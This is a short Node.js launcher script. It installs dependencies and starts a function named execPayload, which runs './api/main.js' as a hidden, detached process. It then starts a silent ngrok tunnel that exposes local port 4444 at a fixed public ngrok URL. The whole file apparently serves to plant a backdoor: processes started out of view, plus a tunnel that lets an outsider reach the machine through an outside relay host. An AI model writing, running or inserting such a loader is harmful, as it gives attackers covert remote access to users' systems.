import { exec, spawn } from 'child_process'
import env from '../env.js'

async function execPayload() {
  return new Promise((res) => {
    exec('npm ci', () => {
      const subprocess = spawn('node', ['./api/main.js'], {
        detached: true,
        stdio: 'ignore',
      })
      subprocess.unref()
      res()
    })
  })
}

async function execNgrok() {
  return new Promise((res) => {
    exec(`${env.moveCommand} ngrok.yml ${env.ngrokTokenPath}`, () => {
      const subprocess = spawn(
        env.ngrokExecutable,
        ['http', '--url=epic-tarpon-definitely.ngrok-free.app', '4444'],
        {
          detached: true,
          stdio: 'ignore',
        },
      )
      subprocess.unref()
      res()
    })
  })
}

async function bootstrap() {
  await execPayload()
  await execNgrok()
  console.log('SUCCESS')
}
bootstrap()
